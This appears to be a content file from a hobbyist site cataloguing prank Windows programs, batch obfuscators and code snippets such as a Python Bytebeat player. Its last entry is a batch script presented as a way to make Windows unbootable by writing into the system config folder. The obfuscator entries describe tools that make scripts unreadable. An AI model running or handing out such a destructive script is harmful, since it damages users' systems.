apps.name: Rick.exe
apps.desc: Annoying prank: changes wallpaper, shows pop-ups & plays Rick ASCII art in CMD.
apps.about: Rick.exe is a harmless Windows prank in Batch + PowerShell. Changes the desktop wallpaper, spawns MessageBox/Toast pop-ups, and opens curl ascii.live/rick in CMD windows. Fully reversible.

apps.name: TrollHacker.exe
apps.desc: A compact multitool with hacker-aesthetic terminal features in one launcher.
apps.about: TrollHacker.exe bundles various terminal utilities under a hacker-style menu. All built in Batch — explore features in the demo.

apps.name: TrollTrozan.bat V2
apps.desc: Prank script in Batch + VBS with improved payloads.
apps.about: TrollTrozan.bat V2 combines Batch and VBScript for harmless chaos. V2 adds more pop-up variety and improved payloads over V1.

apps.name: cst.exe
apps.desc: Cyber Slot Terminal — CMD shell with AI, TTS, Python & full Unicode/ASCII support.
apps.about: cst.exe (Cyber Slot Terminal) is a feature-rich CMD shell. Bundles TrollHacker utilities, Python launcher, CS-Ai, TTS, and full Unicode + ASCII input support.

apps.name: Xenotoxin.exe
apps.desc: Harmless GDI + Bytebeat program — audio-visual chaos for entertainment.
apps.about: Xenotoxin.exe uses Windows GDI to render wild visual patterns while generating procedural audio via Bytebeat. Purely for creative fun.

apps.name: Hyperneuro...tetroxide.exe
apps.desc: Like Xenotoxin but with 15 distinct harmless visual + audio payload modes.
apps.about: Extends Xenotoxin with 15 unique GDI visual + Bytebeat audio payloads. All harmless, all open-source.

apps.name: BingFuscatorCS V1
apps.desc: Batch file obfuscator — feed it a .bat and get a completely unreadable version back.
apps.about: BingFuscatorCS V1 obfuscates Batch scripts using PowerShell. Output is functionally identical but completely unreadable.

apps.name: BingFuscatorCS V2
apps.desc: V2 of the Batch obfuscator — better UI, stronger obfuscation, more features.
apps.about: BingFuscatorCS V2 builds on V1 with improved menus, additional encoding layers, and better compatibility.

apps.name: Chaos.exe
apps.desc: Like memz.exe but completely harmless — visual desktop chaos with no lasting damage.
apps.about: Chaos.exe triggers escalating visual pranks on the Windows desktop. Inspired by memz.exe but causes zero permanent changes — closes cleanly.

apps.name: Iridium
apps.desc: A compact, cool looking IR Debuging Tool for Arduino UNO like Microcontrollers.
apps.about: A compact, cool looking IR Debuging Tool for Arduino UNO like Microcontrollers. Learn More at: https://iridium-csp90.pages.dev

codes.name: C# Bytebeat
codes.desc: Play bytebeat audio in C# using Windows API (only WinMM.dll, no NAudio or any packages) for sound output. Demonstrates procedural audio generation.

codes.name: Python Bytebeat
codes.desc: Play bytebeat audio in Python using PyAudio and NumPy. Demonstrates procedural audio generation.
codes.code:
import numpy as np
import pyaudio

def bytebeat(t):
    return (t&t>>8) & 0xFF

p = pyaudio.PyAudio()
stream = p.open(format=pyaudio.paUInt8, channels=1, rate=8000, output=True)

t = 0
while True:
    buffer = bytes([bytebeat(t + i) for i in range(1024)])
    stream.write(buffer)
    t += 1024

codes.name: Block Windows Terminal
codes.desc: Windows Terminal can't hijack your App. Open in the Default Terminal (Conhost).

codes.name: Windows Forms 98
codes.desc: Make any Windows Forms app look like Windows 98. Retro UI for your .NET apps.

codes.name: Windows Unbootable Maker
codes.desc: Make your Windows unbootable with this simple nuke script.
codes.code:
@echo off
:: WARNING: This is not a joke batch file. It will may harm your PC, but it will create a bomb file in the Windows config folder and display a message. Use at your own risk.
:: NOTE: THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE CAUSED BY THIS FILE. USE AT YOUR OWN RISK.
cd C:\Windows\System32\config
echo %random%%random% >> OSDATA
echo Hi :D! %username% Such a bad news that your PC got Ducked! XD
pause >nul
